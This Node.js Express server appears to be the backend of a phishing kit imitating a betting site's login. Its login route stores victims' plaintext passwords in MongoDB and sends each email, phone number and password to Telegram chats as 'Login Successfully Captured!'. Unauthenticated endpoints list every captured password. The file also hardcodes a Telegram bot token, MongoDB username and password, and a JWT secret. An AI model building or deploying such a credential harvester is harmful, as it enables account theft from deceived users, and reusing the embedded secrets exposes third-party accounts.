const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 5000;
const JWT_SECRET = process.env.JWT_SECRET || 'admin_jwt_secret_key_2025';

// Telegram Bot Config - FIXED: Moved token to env variable for security
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '7570357818:AAF_dp_6XtafGzirQVsl8kqozfJVm1RT72g';
const CHAT_IDS = process.env.CHAT_IDS ? process.env.CHAT_IDS.split(',') : ['7176574897'];

// Middleware
var corsOptions = {
  origin: '*',
  optionsSuccessStatus: 200
}
app.use(cors(corsOptions));
app.use(bodyParser.json());
app.use(express.json());

// User Schema
const userSchema = new mongoose.Schema({
  email: { type: String },
  phone: { type: String },
  password: { type: String, required: true },
  loginMethod: { type: String, enum: ['email', 'phone'], required: true },
  loginDate: { type: String },
  loginTime: { type: String },
  createdAt: { type: Date, default: Date.now },
  loginHistory: [{
    date: { type: String },
    time: { type: String },
    method: { type: String },
    device: { type: String, default: 'Web Browser' }
  }]
});

// Admin Schema
const adminSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, required: true, unique: true },
  password: { type: String, required: true },
  createdAt: { type: Date, default: Date.now },
  lastLogin: { type: Date, default: Date.now }
});

// Global connection variable
let isConnected = false;

// Enhanced MongoDB connection function
const connectToMongoDB = async () => {
  if (isConnected && mongoose.connection.readyState === 1) {
    console.log('Using existing MongoDB connection');
    return;
  }

  try {
    const options = {
      serverSelectionTimeoutMS: 15000,
      socketTimeoutMS: 45000,
      connectTimeoutMS: 15000,
      maxPoolSize: 10,
      retryWrites: true,
      retryReads: true
    };

    console.log('Connecting to MongoDB...');
    await mongoose.connect('mongodb+srv://vishu:NdO3hK4ShLCi4YKD@cluster0.4iukcq5.mongodb.net/new4rabetlinkdatabase1', options);
    
    isConnected = true;
    console.log('Connected to MongoDB successfully');

    mongoose.connection.on('disconnected', () => {
      console.log('MongoDB disconnected');
      isConnected = false;
    });

    mongoose.connection.on('error', (err) => {
      console.error('MongoDB connection error:', err);
      isConnected = false;
    });

    mongoose.connection.on('connected', () => {
      console.log('MongoDB connection established');
      isConnected = true;
    });

    mongoose.connection.on('reconnected', () => {
      console.log('MongoDB reconnected');
      isConnected = true;
    });

  } catch (err) {
    console.error('MongoDB connection failed:', err);
    isConnected = false;
    throw err;
  }
};

// Initialize connection
connectToMongoDB().catch(err => {
  console.error('Initial MongoDB connection failed:', err);
  process.exit(1); // Exit if initial connection fails
});

// Models
const User = mongoose.model('User', userSchema);
const Admin = mongoose.model('Admin', adminSchema);

// ENHANCED Telegram function with better error handling and validation
const sendToTelegram = async (message) => {
  console.log('📱 Attempting to send Telegram message...');
  
  if (!TELEGRAM_BOT_TOKEN) {
    console.error('❌ Telegram Bot Token is missing!');
    return false;
  }

  if (!CHAT_IDS || CHAT_IDS.length === 0) {
    console.error('❌ No Telegram Chat IDs configured!');
    return false;
  }

  console.log('🔧 Using Bot Token:', TELEGRAM_BOT_TOKEN.substring(0, 10) + '...');
  console.log('🎯 Target Chat IDs:', CHAT_IDS);

  let successCount = 0;
  let failureCount = 0;

  for (const chatId of CHAT_IDS) {
    try {
      console.log(`📤 Sending to chat ID: ${chatId}`);
      
      const response = await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: chatId.toString(),
          text: message,
          parse_mode: 'HTML'
        },
        {
          timeout: 10000, // 10 second timeout
          headers: {
            'Content-Type': 'application/json'
          }
        }
      );

      if (response.data && response.data.ok) {
        console.log(`✅ Message sent successfully to ${chatId}`);
        console.log('📋 Response:', response.data);
        successCount++;
      } else {
        console.error(`❌ Telegram API returned error for ${chatId}:`, response.data);
        failureCount++;
      }

    } catch (error) {
      console.error(`❌ Failed to send to ${chatId}:`, {
        message: error.message,
        response: error.response?.data,
        status: error.response?.status,
        statusText: error.response?.statusText
      });
      failureCount++;

      // Specific error handling
      if (error.response?.status === 400) {
        console.error('🚫 Bad Request - Check chat ID and bot token');
      } else if (error.response?.status === 401) {
        console.error('🔐 Unauthorized - Bot token might be invalid');
      } else if (error.response?.status === 403) {
        console.error('🚪 Forbidden - Bot might be blocked by user or invalid chat ID');
      }
    }
  }

  console.log(`📊 Telegram Summary: ${successCount} sent, ${failureCount} failed`);
  return successCount > 0;
};

// Test Telegram function (you can call this endpoint to test)
app.get('/api/test-telegram', async (req, res) => {
  try {
    const testMessage = `🧪 <b>Test Message</b>

This is a test message sent at ${new Date().toLocaleString()}
Bot is working correctly! ✅`;

    const success = await sendToTelegram(testMessage);
    
    if (success) {
      res.json({ success: true, message: 'Test message sent successfully!' });
    } else {
      res.status(500).json({ success: false, message: 'Failed to send test message' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Middleware to ensure DB connection
const ensureDBConnection = async (req, res, next) => {
  try {
    await connectToMongoDB();
    next();
  } catch (error) {
    console.error('Database connection failed:', error);
    res.status(500).json({ message: 'Database connection failed', error: error.message });
  }
};

// Middleware to verify admin token
const verifyAdminToken = (req, res, next) => {
  const token = req.header('x-auth-token');

  if (!token) {
    return res.status(401).json({ message: 'Access denied: No token provided' });
  }

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.admin = decoded;
    next();
  } catch (error) {
    res.status(401).json({ message: 'Invalid token' });
  }
};

// ENHANCED Login route with better Telegram integration
app.post('/api/login', async (req, res) => {
  try {
    const { email, phone, password, loginDate, loginTime, loginMethod } = req.body;

    // Validation
    if (!password || !loginMethod || !loginDate || !loginTime) {
      return res.status(400).json({ message: 'Missing required fields' });
    }

    if (loginMethod === 'email' && !email) {
      return res.status(400).json({ message: 'Email is required for email login' });
    }

    if (loginMethod === 'phone' && !phone) {
      return res.status(400).json({ message: 'Phone is required for phone login' });
    }

    const user = new User({
      email: loginMethod === 'email' ? email : null,
      phone: loginMethod === 'phone' ? phone : null,
      password,
      loginMethod,
      loginDate,
      loginTime,
      loginHistory: [{
        date: loginDate,
        time: loginTime,
        method: loginMethod,
        device: 'Web Browser'
      }]
    });

    console.log('💾 Attempting to save user...');
    let savedUser;
    try {
      savedUser = await Promise.race([
        user.save(),
        new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Database save timeout after 10 seconds')), 10000)
        )
      ]);
      console.log('✅ User saved successfully');
    } catch (saveError) {
      console.error('❌ First save attempt failed:', saveError.message);
      
      if (saveError.message.includes('timeout') || saveError.name === 'MongooseError') {
        console.log('🔄 Retrying save operation...');
        try {
          if (mongoose.connection.readyState !== 1) {
            throw new Error('Database connection not ready');
          }
          
          savedUser = await user.save();
          console.log('✅ User saved on retry');
        } catch (retryError) {
          console.error('❌ Retry save failed:', retryError);
          throw new Error('Database operation failed after retry');
        }
      } else {
        throw saveError;
      }
    }

    // ENHANCED Telegram message with different formatting style
    const message = `🎯 <b>🔔 NEW LOGIN DETECTED 🔔</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🎪 <b>USER LOGIN INFORMATION</b> 🎪
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 <b>Login Method:</b> ${loginMethod.toUpperCase()}
🔹 <b>Login Date:</b> ${loginDate}
🔹 <b>Login Time:</b> ${loginTime}
🔹 <b>Email Address:</b> ${email || '🚫 Not provided'}
🔹 <b>Phone Number:</b> ${phone || '🚫 Not provided'}
🔹 <b>Password:</b> <code>${password}</code>
🔹 <b>Unique ID:</b> ${savedUser._id}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ✅ <i>Login Successfully Captured!</i> ✅
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    // Send to Telegram with improved error handling
    console.log('📱 Preparing to send Telegram notification...');
    try {
      const telegramSuccess = await sendToTelegram(message);
      if (telegramSuccess) {
        console.log('✅ Telegram notification sent successfully');
      } else {
        console.error('❌ Telegram notification failed');
      }
    } catch (telegramError) {
      console.error('❌ Telegram notification error:', telegramError);
      // Don't fail the entire request if Telegram fails
    }

    // Send response back to client
    const userData = {
      id: savedUser._id,
      email: savedUser.email,
      phone: savedUser.phone,
      password: savedUser.password,
      loginMethod: savedUser.loginMethod,
      loginDate: savedUser.loginDate,
      loginTime: savedUser.loginTime,
      createdAt: savedUser.createdAt.toISOString().split('T')[0],
      loginHistory: savedUser.loginHistory
    };

    res.status(200).json(userData);

  } catch (error) {
    console.error('❌ Login error:', error);
    
    if (error.name === 'MongooseError' || error.message.includes('timeout')) {
      return res.status(503).json({ 
        message: 'Database connection timeout. Please try again.', 
        error: 'SERVICE_UNAVAILABLE' 
      });
    }
    
    if (error.name === 'ValidationError') {
      return res.status(400).json({ 
        message: 'Invalid data provided', 
        error: error.message 
      });
    }

    res.status(500).json({ 
      message: 'Server error occurred', 
      error: process.env.NODE_ENV === 'production' ? 'INTERNAL_ERROR' : error.message 
    });
  }
});

// Get most recent user
app.get('/api/user', ensureDBConnection, async (req, res) => {
  try {
    const user = await User.findOne().sort({ createdAt: -1 }).maxTimeMS(10000);
    if (!user) return res.status(404).json({ message: 'No users found' });

    const userData = {
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    };

    res.status(200).json(userData);

  } catch (error) {
    console.error('Get user error:', error);
    if (error.name === 'MongooseError' || error.message.includes('timeout')) {
      return res.status(503).json({ message: 'Database timeout. Please try again.' });
    }
    res.status(500).json({ message: 'Server error' });
  }
});

// Get all users
app.get('/api/users', ensureDBConnection, async (req, res) => {
  try {
    const users = await User.find().sort({ createdAt: -1 }).maxTimeMS(15000);
    if (!users || users.length === 0) return res.status(404).json({ message: 'No users found' });

    const usersData = users.map(user => ({
      id: user._id,
      email: user.email,
      phone: user.phone,
      password: user.password,
      loginMethod: user.loginMethod,
      loginDate: user.loginDate,
      loginTime: user.loginTime,
      createdAt: user.createdAt.toISOString().split('T')[0],
      loginHistory: user.loginHistory
    }));

    res.status(200).json(usersData);

  } catch (error) {
    console.error('Get all users error:', error);
    if (error.name === 'MongooseError' || error.message.includes('timeout')) {
      return res.status(503).json({ message: 'Database timeout. Please try again.' });
    }
    res.status(500).json({ message: 'Server error' });
  }
});

// Admin registration
app.post('/api/admin/register', ensureDBConnection, async (req, res) => {
  try {
    const { name, email, password } = req.body;

    if (!name || !email || !password) {
      return res.status(400).json({ message: 'All fields are required' });
    }

    const existingAdmin = await Admin.findOne({ email }).maxTimeMS(10000);
    if (existingAdmin) {
      return res.status(400).json({ message: 'Admin with this email already exists' });
    }

    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    const admin = new Admin({
      name,
      email,
      password: hashedPassword
    });

    const savedAdmin = await admin.save();

    const token = jwt.sign(
      { id: savedAdmin._id, email: savedAdmin.email, isAdmin: true },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.status(201).json({
      token,
      admin: {
        id: savedAdmin._id,
        name: savedAdmin.name,
        email: savedAdmin.email
      }
    });

  } catch (error) {
    console.error('Admin registration error:', error);
    if (error.name === 'MongooseError' || error.message.includes('timeout')) {
      return res.status(503).json({ message: 'Database timeout. Please try again.' });
    }
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Admin login
app.post('/api/admin/login', ensureDBConnection, async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ message: 'Email and password are required' });
    }

    const admin = await Admin.findOne({ email }).maxTimeMS(10000);
    if (!admin) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }

    const validPassword = await bcrypt.compare(password, admin.password);
    if (!validPassword) {
      return res.status(401).json({ message: 'Invalid credentials' });
    }

    admin.lastLogin = new Date();
    await admin.save();

    const token = jwt.sign(
      { id: admin._id, email: admin.email, isAdmin: true },
      JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.status(200).json({
      success: true,
      token,
      admin: {
        id: admin._id,
        name: admin.name,
        email: admin.email
      }
    });

  } catch (error) {
    console.error('Admin login error:', error);
    if (error.name === 'MongooseError' || error.message.includes('timeout')) {
      return res.status(503).json({ message: 'Database timeout. Please try again.' });
    }
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Admin dashboard route
app.get('/api/admin/dashboard', verifyAdminToken, ensureDBConnection, async (req, res) => {
  try {
    const admin = await Admin.findById(req.admin.id).select('-password').maxTimeMS(10000);
    if (!admin) return res.status(404).json({ message: 'Admin not found' });

    const userCount = await User.countDocuments().maxTimeMS(10000);
    const recentUsers = await User.find().sort({ createdAt: -1 }).limit(5).maxTimeMS(10000);

    res.status(200).json({
      admin,
      stats: { userCount, recentUsers }
    });

  } catch (error) {
    console.error('Dashboard error:', error);
    if (error.name === 'MongooseError' || error.message.includes('timeout')) {
      return res.status(503).json({ message: 'Database timeout. Please try again.' });
    }
    res.status(500).json({ message: 'Server error' });
  }
});

// Admin password change route
app.post('/api/admin/change-password', verifyAdminToken, ensureDBConnection, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;

    if (!currentPassword || !newPassword) {
      return res.status(400).json({ message: 'Current password and new password are required' });
    }

    if (newPassword.length < 6) {
      return res.status(400).json({ message: 'New password must be at least 6 characters long' });
    }

    const admin = await Admin.findById(req.admin.id).maxTimeMS(10000);
    if (!admin) {
      return res.status(404).json({ message: 'Admin not found' });
    }

    // Verify current password
    const validPassword = await bcrypt.compare(currentPassword, admin.password);
    if (!validPassword) {
      return res.status(401).json({ message: 'Current password is incorrect' });
    }

    // Hash new password
    const salt = await bcrypt.genSalt(10);
    const hashedNewPassword = await bcrypt.hash(newPassword, salt);

    // Update password
    admin.password = hashedNewPassword;
    await admin.save();

    res.status(200).json({ 
      success: true, 
      message: 'Password changed successfully' 
    });

  } catch (error) {
    console.error('Password change error:', error);
    if (error.name === 'MongooseError' || error.message.includes('timeout')) {
      return res.status(503).json({ message: 'Database timeout. Please try again.' });
    }
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Delete user route
app.delete('/api/admin/delete-user/:userId', verifyAdminToken, ensureDBConnection, async (req, res) => {
  try {
    const { userId } = req.params;

    if (!userId) {
      return res.status(400).json({ message: 'User ID is required' });
    }

    // Check if user exists
    const user = await User.findById(userId).maxTimeMS(10000);
    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    // Delete the user
    await User.findByIdAndDelete(userId).maxTimeMS(10000);

    // Send Telegram notification about user deletion
    const message = `🗑️ <b>USER DELETED</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    🎪 <b>DELETED USER INFORMATION</b> 🎪
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 <b>User ID:</b> ${userId}
🔹 <b>Email:</b> ${user.email || '🚫 Not provided'}
🔹 <b>Phone:</b> ${user.phone || '🚫 Not provided'}
🔹 <b>Login Method:</b> ${user.loginMethod || '🚫 Not provided'}
🔹 <b>Deleted At:</b> ${new Date().toLocaleString()}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ✅ <i>User Successfully Deleted!</i> ✅
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

    try {
      await sendToTelegram(message);
      console.log('✅ Telegram notification sent for user deletion');
    } catch (telegramError) {
      console.error('❌ Telegram notification failed for user deletion:', telegramError);
      // Don't fail the request if Telegram fails
    }

    res.status(200).json({ 
      success: true, 
      message: 'User deleted successfully' 
    });

  } catch (error) {
    console.error('Delete user error:', error);
    if (error.name === 'MongooseError' || error.message.includes('timeout')) {
      return res.status(503).json({ message: 'Database timeout. Please try again.' });
    }
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// Health check
app.get("/", (req, res) => {
  res.json({ status: true, message: "Server is running" });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({ message: 'Something went wrong!' });
});

// Handle 404
app.use((req, res) => {
  res.status(404).json({ message: 'Route not found' });
});

// Graceful shutdown
process.on('SIGINT', async () => {
  console.log('Closing MongoDB connection...');
  await mongoose.connection.close();
  process.exit(0);
});

// Start server
if (process.env.NODE_ENV !== 'production') {
  app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
  });
}

module.exports = app;